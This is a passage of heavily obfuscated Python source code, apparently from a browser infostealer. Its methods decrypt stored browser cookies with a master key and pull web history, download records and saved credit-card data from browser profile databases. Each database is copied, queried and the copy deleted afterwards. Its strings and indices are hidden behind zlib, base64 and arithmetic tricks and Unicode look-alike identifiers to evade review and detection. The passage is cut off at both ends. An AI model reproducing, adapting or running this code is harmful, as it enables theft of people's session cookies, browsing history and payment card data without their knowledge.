𝗿𝗼𝘸[𝙞𝗻𝘁.from_bytes(𝙢𝘢𝗽(lambda O, i: 723 - (𝙞𝘯𝙩(𝗢) + 𝘪), 𝗺𝘢𝘱(__𝗶𝙢𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝙞𝙩𝙚𝗿(__𝗶𝙢𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xab\xf2\xac\x04\x00\x03\xb5\x01\x8b')).decode())] * 3)), 𝗿𝙖𝙣𝗴𝗲(1)), __𝗶𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝗿𝘰𝘸[𝘪𝙣𝘵.from_bytes(𝗺𝗮𝘱(lambda O, i: 560 - (𝘪𝗻𝘁(𝘖) + 𝗶), 𝘮𝙖𝗽(__𝘪𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝘪𝘁𝙚𝙧(__𝗶𝙢𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3\x0b\t5\x01\x00\x03\x16\x01,')).decode())] * 3)), 𝘳𝙖𝗻𝗴𝘦(1)), __𝙞𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝗿𝗼𝙬[𝗶𝗻𝙩.from_bytes(𝘮𝘢𝘱(lambda O, i: 846 - (𝗶𝘯𝙩(𝘖) + 𝙞), 𝙢𝙖𝙥(__𝙞𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝗶𝘁𝗲𝙧(__𝘪𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3w\t\xac\x02\x00\x03(\x01_')).decode())] * 3)), 𝗿𝗮𝙣𝗴𝗲(1)), __𝘪𝗺𝘱𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝗰𝗼𝗼𝗸𝗶𝘦 = 𝘀𝘦𝙡𝙛.decrypt_password(𝗿𝘰𝙬[𝗶𝙣𝙩.from_bytes(𝗺𝗮𝘱(lambda O, i: 322 - (𝙞𝗻𝘵(𝘖) + 𝙞), 𝘮𝗮𝙥(__𝘪𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝙞𝘵𝗲𝙧(__𝗶𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xadr5\x05\x00\x03e\x01B')).decode())] * 3)), 𝙧𝘢𝗻𝘨𝘦(1)), __𝙞𝙢𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙨𝗲𝙡𝘧.master_key)
            __𝘊𝙊𝙊𝙆𝘐𝙀𝗦__.append(𝘛𝙮𝗽𝗲𝙨.Cookie(𝙧𝙤𝘸[𝘪𝗻𝙩.from_bytes(𝙢𝗮𝘱(lambda O, i: 982 - (𝘪𝘯𝘵(𝘖) + 𝘪), 𝘮𝘢𝗽(__𝘪𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝙞𝘵𝗲𝙧(__𝗶𝗺𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝘯𝘨𝙚(0)), __𝗶𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝙤𝙬[𝙞𝘯𝙩.from_bytes(𝘮𝘢𝙥(lambda O, i: 864 - (𝙞𝘯𝘵(𝙊) + 𝗶), 𝙢𝗮𝗽(__𝗶𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝙞𝘁𝗲𝘳(__𝗶𝙢𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3w\x89\xac\x02\x00\x038\x01g')).decode())] * 3)), 𝙧𝗮𝙣𝙜𝗲(1)), __𝘪𝙢𝘱𝗼𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝘰𝙬[𝘪𝙣𝘁.from_bytes(𝙢𝘢𝗽(lambda O, i: 760 - (𝗶𝘯𝘵(𝙊) + 𝙞), 𝗺𝘢𝘱(__𝘪𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝙞𝘁𝗲𝗿(__𝗶𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xab\n5\x01\x00\x03\x88\x01R')).decode())] * 3)), 𝙧𝙖𝘯𝙜𝘦(1)), __𝘪𝘮𝗽𝙤𝘳𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙘𝗼𝙤𝘬𝘪𝙚, 𝗿𝗼𝘄[𝘪𝙣𝘵.from_bytes(𝘮𝘢𝗽(lambda O, i: 879 - (𝗶𝙣𝙩(𝗢) + 𝘪), 𝘮𝙖𝗽(__𝗶𝘮𝗽𝗼𝙧𝘁__('base64').b64decode(__𝘪𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝗶𝙩𝗲𝘳(__𝘪𝙢𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3wI6\x04\x00\x03\x03\x01(')).decode())] * 3)), 𝗿𝘢𝘯𝗴𝘦(1)), __𝙞𝙢𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝗰𝙤𝘯𝘯.close()
        𝙤𝙨.remove(__𝘪𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())

    def get_web_history(self, path, profile):
        𝘸𝘦𝗯_𝘩𝗶𝙨𝙩𝗼𝘳𝘺_𝘥𝙗 = __𝙞𝗺𝙥𝙤𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK56LN\x05\xe2`\xf7\x9c\xaa\x14w\xcb\xca\xd4@[[\x00B=\x06f')).decode().format(𝘱𝙖𝘁𝙝, 𝗽𝘳𝙤𝗳𝘪𝙡𝗲)
        if not 𝙤𝘴.path.exists(𝘄𝙚𝙗_𝘩𝘪𝘀𝘁𝘰𝘳𝘆_𝘥𝘣):
            return
        𝘴𝗵𝙪𝘵𝘪𝘭.copy(𝘄𝗲𝙗_𝙝𝙞𝘴𝘁𝘰𝙧𝘺_𝘥𝘣, __𝘪𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())
        𝗰𝙤𝗻𝗻 = 𝘀𝗾𝗹𝗶𝙩𝘦3.connect(__𝙞𝙢𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())
        𝗰𝘂𝙧𝘴𝗼𝗿 = 𝘤𝘰𝘯𝘯.cursor()
        𝘤𝘶𝙧𝘀𝘰𝘳.execute(__𝗶𝘮𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xabLr.OOq\xcf1Hr\x0f-\xf6t\xaf\xc8H6\x0eJK\xc9\xcd\xa9J\x8c\x00\xd2\xee9%Q\xc1N\xee\xa1\xd9\x96~`\xb5\x1e\xbe\xb6\x00q\xa2\x14\x90')).decode())
        for 𝗿𝙤𝙬 in 𝗰𝘶𝙧𝘀𝙤𝙧.fetchall():
            if not 𝘳𝗼𝘄[𝘪𝗻𝘵.from_bytes(𝘮𝙖𝗽(lambda O, i: 733 - (𝘪𝙣𝘵(𝘖) + 𝗶), 𝘮𝙖𝗽(__𝗶𝙢𝘱𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝗶𝘁𝗲𝗿(__𝗶𝘮𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝙣𝘨𝗲(0)), __𝙞𝙢𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝗼𝘸[𝙞𝙣𝘁.from_bytes(𝙢𝗮𝗽(lambda O, i: 495 - (𝗶𝗻𝙩(𝘖) + 𝙞), 𝗺𝙖𝘱(__𝗶𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝘪𝘵𝙚𝘳(__𝘪𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3s\xc96\x00\x00\x03\x0e\x01.')).decode())] * 3)), 𝙧𝗮𝗻𝙜𝗲(1)), __𝗶𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝙤𝘄[𝙞𝙣𝘵.from_bytes(𝗺𝙖𝗽(lambda O, i: 352 - (𝙞𝗻𝙩(𝙊) + 𝗶), 𝗺𝘢𝙥(__𝗶𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝗶𝘁𝘦𝘳(__𝙞𝘮𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xad\n-\x07\x00\x03\xc7\x01\x94')).decode())] * 3)), 𝘳𝙖𝙣𝙜𝗲(1)), __𝗶𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            __𝙒𝘌𝘉_𝗛𝗜𝙎𝘛𝘖𝙍𝘠__.append(𝙏𝘺𝙥𝗲𝘀.WebHistory(𝗿𝘰𝙬[𝗶𝙣𝙩.from_bytes(𝘮𝘢𝘱(lambda O, i: 899 - (𝘪𝗻𝘁(𝗢) + 𝘪), 𝗺𝙖𝙥(__𝘪𝙢𝙥𝘰𝘳𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝘪𝘵𝘦𝘳(__𝗶𝙢𝘱𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝙚(0)), __𝗶𝗺𝘱𝘰𝙧𝘁__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝙤𝘸[𝙞𝙣𝘁.from_bytes(𝙢𝘢𝗽(lambda O, i: 539 - (𝗶𝘯𝘵(𝘖) + 𝗶), 𝗺𝗮𝘱(__𝙞𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝙞𝘵𝗲𝗿(__𝘪𝗺𝙥𝗼𝙧𝘵__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0b\xf15\x01\x00\x03\x06\x01$')).decode())] * 3)), 𝙧𝙖𝙣𝘨𝙚(1)), __𝘪𝘮𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝙤𝙬[𝙞𝗻𝙩.from_bytes(𝙢𝘢𝙥(lambda O, i: 676 - (𝗶𝗻𝘵(𝘖) + 𝘪), 𝗺𝗮𝗽(__𝙞𝙢𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝘪𝙩𝘦𝗿(__𝙞𝙢𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcbJ6\x00\x00\x03p\x01L')).decode())] * 3)), 𝙧𝙖𝗻𝗴𝙚(1)), __𝘪𝘮𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝗼𝗻𝗻.close()
        𝗼𝘀.remove(__𝙞𝘮𝗽𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())

    def get_downloads(self, path, profile):
        𝘥𝙤𝘸𝗻𝙡𝗼𝘢𝙙𝘀_𝙙𝙗 = __𝙞𝘮𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK56LN\x05\xe2`\xf7\x9c\xaa\x14w\xcb\xca\xd4@[[\x00B=\x06f')).decode().format(𝘱𝗮𝙩𝗵, 𝙥𝙧𝗼𝙛𝘪𝗹𝘦)
        if not 𝘰𝙨.path.exists(𝘥𝗼𝘸𝘯𝘭𝙤𝘢𝙙𝙨_𝗱𝗯):
            return
        𝘴𝙝𝙪𝙩𝗶𝘭.copy(𝘥𝗼𝙬𝘯𝗹𝙤𝗮𝘥𝘴_𝙙𝘣, __𝗶𝘮𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝗰𝗼𝙣𝗻 = 𝘴𝗾𝙡𝘪𝘵𝗲3.connect(__𝘪𝘮𝗽𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝗰𝙪𝙧𝘴𝙤𝘳 = 𝘤𝗼𝘯𝘯.cursor()
        𝘤𝙪𝘳𝙨𝘰𝙧.execute(__𝘪𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xca\x88\xcc\xb14L\xce-/\x06\xb1\x93sSrR\xdc,\xcb##\x82\xf2=]\xa3\x82C\x0c\x0c\xd2\xa3\xdc-\x8d\x93r+\xca"\xc3\x83\xaa\x00\x13\xf6\x12\xfa')).decode())
        for 𝘳𝙤𝘸 in 𝙘𝘂𝘳𝙨𝗼𝙧.fetchall():
            if not 𝘳𝘰𝙬[𝙞𝙣𝙩.from_bytes(𝙢𝙖𝗽(lambda O, i: 455 - (𝙞𝘯𝘁(𝗢) + 𝙞), 𝙢𝘢𝙥(__𝗶𝙢𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝘪𝙩𝗲𝗿(__𝗶𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝘯𝘨𝘦(0)), __𝙞𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝗼𝘄[𝘪𝙣𝘵.from_bytes(𝘮𝗮𝗽(lambda O, i: 745 - (𝙞𝗻𝙩(𝙊) + 𝗶), 𝙢𝙖𝗽(__𝗶𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝘪𝙩𝙚𝗿(__𝗶𝙢𝘱𝙤𝙧𝘁__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xab\n4\x00\x00\x03|\x01J')).decode())] * 3)), 𝗿𝗮𝙣𝘨𝙚(1)), __𝙞𝙢𝙥𝗼𝙧𝘁__('base64').b64decode(__𝙞𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]:
                continue
            __𝘿𝘖𝙒𝗡𝗟𝘖𝘼𝘿𝗦__.append(𝘛𝘺𝘱𝘦𝘴.Download(𝘳𝙤𝘸[𝘪𝗻𝘵.from_bytes(𝘮𝙖𝗽(lambda O, i: 262 - (𝗶𝘯𝘁(𝙊) + 𝙞), 𝗺𝘢𝘱(__𝗶𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝗶𝘵𝙚𝙧(__𝙞𝙢𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝘯𝗴𝗲(0)), __𝙞𝘮𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝘰𝘸[𝘪𝗻𝙩.from_bytes(𝘮𝗮𝙥(lambda O, i: 691 - (𝙞𝗻𝙩(𝗢) + 𝗶), 𝙢𝘢𝘱(__𝘪𝘮𝗽𝗼𝙧𝙩__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝘪𝘵𝘦𝗿(__𝙞𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xcb\xca.\x07\x00\x03\xc7\x01\x9b')).decode())] * 3)), 𝗿𝙖𝘯𝗴𝘦(1)), __𝙞𝘮𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝗰𝘰𝗻𝘯.close()
        𝗼𝙨.remove(__𝙞𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())

    def get_credit_cards(self, path, profile):
        𝗰𝘢𝗿𝙙𝙨_𝙙𝘣 = __𝙞𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK56LN\x05\xe20\xa3\xb0LO\xd7\xa0\x8c\x14wW[\x00?N\x06\x15')).decode().format(𝗽𝙖𝘁𝘩, 𝘱𝙧𝗼𝙛𝘪𝙡𝙚)
        if not 𝙤𝘴.path.exists(𝙘𝗮𝗿𝘥𝘴_𝙙𝗯):
            return
        𝙨𝙝𝘂𝘵𝘪𝘭.copy(𝗰𝗮𝙧𝙙𝘴_𝙙𝙗, __𝘪𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝙘𝗼𝙣𝙣 = 𝘴𝘲𝘭𝘪𝘵𝘦3.connect(__𝙞𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝙘𝘂𝘳𝘴𝘰𝘳 = 𝙘𝙤𝗻𝘯.cursor()
        𝙘𝙪𝙧𝘴𝙤𝘳.execute(__𝘪𝗺𝘱𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdae\x8dA\x0b\xc2 \x18\x86\xff\x92\t\x1e<t\xd9`6i\xa3,\xf5\x9b7]\xdbd~\x83\xa0h\xf8\xef\x13:v}\xde\x87\xf7\xd1\xc4tJ\xf7\xba\x15,\x06k\xe6@\xd9<\xd0&\xbbz_\x1c\xc4\xdd\x83\x8c\x0f\x81\x9f\x80\xfc]6\xe2\xff9s\xb6\xc9\xe7\xbaZ\x07\x90\t(;\x04+qD\x8ea\xeb\xf3\x04\x15q\xf6\xfaj\x85*~\xf9\xb7<y\xeb\x9e\x85-\n\xe5\xe5~\xab\xd6q3\xc9\x83\xfauO\xdd\xf1\x0b\xa1_2\x87')).decode())
        for 𝘳𝙤𝘄 in 𝘤𝘂𝘳𝘀𝙤𝗿.fetchall():
            if not 𝘳𝘰𝘸[𝙞𝙣𝘵.from_bytes(𝙢𝗮𝗽(lambda O, i: 624 - (𝘪𝘯𝙩(𝙊) + 𝘪), 𝗺𝗮𝘱(__𝙞𝗺𝙥𝙤𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝗶𝙩𝘦𝙧(__𝙞𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝘪𝙢𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝙣𝘨𝘦(0)), __𝗶𝗺𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝙧𝙤𝘄[𝗶𝙣𝘁.from_bytes(𝘮𝙖𝘱(lambda O, i: 289 - (𝙞𝙣𝘁(𝘖) + 𝗶), 𝘮𝗮𝗽(__𝙞𝙢𝙥𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝙞𝙩𝙚𝙧(__𝘪𝙢𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xcdJ7\x01\x00\x03x\x01S')).decode())] * 3)), 𝙧𝙖𝘯𝙜𝗲(1)), __𝘪𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝗿𝙤𝘸[𝘪𝙣𝘵.from_bytes(𝘮𝙖𝗽(lambda O, i: 835 - (𝗶𝙣𝘁(𝘖) + 𝗶), 𝘮𝘢𝗽(__𝘪𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝗶𝙩𝗲𝘳(__𝙞𝗺𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\xf3w\xf1\xad\x02\x00\x03 \x01[')).decode())] * 3)), 𝘳𝗮𝗻𝙜𝗲(1)), __𝙞𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝘳𝗼𝙬[𝙞𝙣𝙩.from_bytes(𝙢𝘢𝙥(lambda O, i: 385 - (𝘪𝘯𝘵(𝗢) + 𝙞), 𝗺𝘢𝘱(__𝘪𝗺𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝙞𝙩𝘦𝗿(__𝗶𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝙢𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xadJ\xaf\x04\x00\x03\xed\x01\xa8')).decode())] * 3)), 𝙧𝗮𝘯𝙜𝙚(1)), 